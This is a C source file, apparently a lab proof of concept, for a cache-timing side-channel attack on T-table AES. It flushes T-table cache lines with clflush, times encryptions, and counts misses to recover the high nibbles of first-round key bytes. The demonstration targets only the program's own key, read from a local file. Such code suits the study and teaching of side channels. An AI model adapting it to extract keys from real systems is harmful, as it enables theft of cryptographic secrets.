#include <stdio.h>
#include <math.h>
#include <string.h>
#include <stdlib.h>
#include <sys/time.h>
#include <time.h>

#include <aes.h>

#include "params.h"
#define TIME_THRESHOLD 10        /*cache miss threshold*/
#define ITERATIONS (1 << 10) + 1 /* The maximum iterations for making the statistics */
AES_KEY expanded;

unsigned char pt[16]; /* Holds the Plaintext */
unsigned char ct[16]; /* Holds the ciphertext */

unsigned int fmiss[16][256]; /* Holds the cache miss frequency     */

void attack()
{
    int i, j;
    int tic, toc, hit_time, evict_time;
    FILE *f;
    f = fopen("log", "w");
    for (i = 0; i < 16; i++)
        for (j = 0; j < 16; j++)
            fmiss[i][j] = 0;
    for (int x = 0; x < ITERATIONS; ++x)
    {
        for (int pos = 0; pos < 16; pos++)
        {
            for (int b = 0; b < 256; b++)
            {
                /* Set a random plaintext */
                for (i = 0; i < 16; ++i)
                    pt[i] = random() & 0xff;

                /*set the first 4 bits of pt to first 4 bits of b*/
                pt[pos] = b & 0xf0;

                /* evict all T-table data from cache */
                asm volatile("mfence");
                clean_tables();
                asm volatile("mfence");

                /* Fill cache with required T-table data */
                for (int try = 0; try < 8; try++)
                    AES_encrypt(pt, ct, &expanded);

                /* Time AES with filled cache */
                tic = timestamp();
                AES_encrypt(pt, ct, &expanded);
                toc = timestamp();

                hit_time = toc - tic;
                // printf("Hit tim: %lld \n", hit_time);

                /* Evict first block of appropriate T-table from cache */
                asm volatile("mfence");
                if (pos % 4 == 0)
                    asm volatile("clflush (%0)" ::"r"(Te0));
                else if (pos % 4 == 1)
                    asm volatile("clflush (%0)" ::"r"(Te1));
                else if (pos % 4 == 2)
                    asm volatile("clflush (%0)" ::"r"(Te2));
                else
                    asm volatile("clflush (%0)" ::"r"(Te3));
                asm volatile("mfence");

                /* Time AES with evicted cache */
                tic = timestamp();
                AES_encrypt(pt, ct, &expanded);
                toc = timestamp();

                evict_time = toc - tic;
                // printf("Evicted time: %lld \n", evict_time);
                if ((evict_time - hit_time) > TIME_THRESHOLD)
                    fmiss[pos][b] += 1;
            }
        }

        if (!(x & (x - 1)))
        {
            printf("%d\n", x);
            for (int pos = 0; pos < 16; pos++)
            {
                int max_misses = 0, max_misses_byte = 0;
                for (int b = 0; b < 256; b++)
                {
                    if (fmiss[pos][b] > max_misses)
                    {
                        max_misses = fmiss[pos][b];
                        max_misses_byte = (b >> 4);
                    }
                }
                printf("%X ", max_misses_byte);
            }
            printf("\n");
        }
    }

    for (int pos = 0; pos < 16; pos++)
    {
        for (j = 0; j < 256; j++)
            fprintf(f, "%d ", fmiss[pos][j]);
        fprintf(f, "\n");
    }

    fclose(f);
}
void ReadKey(const unsigned char *filename)
{
    int i;
    FILE *f;
    unsigned int i_secretkey[16];
    unsigned char uc_secretkey[16];

    /* Read key from a file */
    if ((f = fopen(filename, "r")) == NULL)
    {
        printf("Cannot open key file\n");
        exit(-1);
    }
    for (i = 0; i < 16; ++i)
    {
        fscanf(f, "%x", &i_secretkey[i]);
        uc_secretkey[i] = (unsigned char)i_secretkey[i];
    }
    fclose(f);
    AES_set_encrypt_key(uc_secretkey, 128, &expanded);
}

/*
 * The main
 */
int main(int argc, char **argv)
{
    srandom(timestamp());

    ReadKey("key");
    printf("Getting First Round Key Relations\n");
    attack();
}
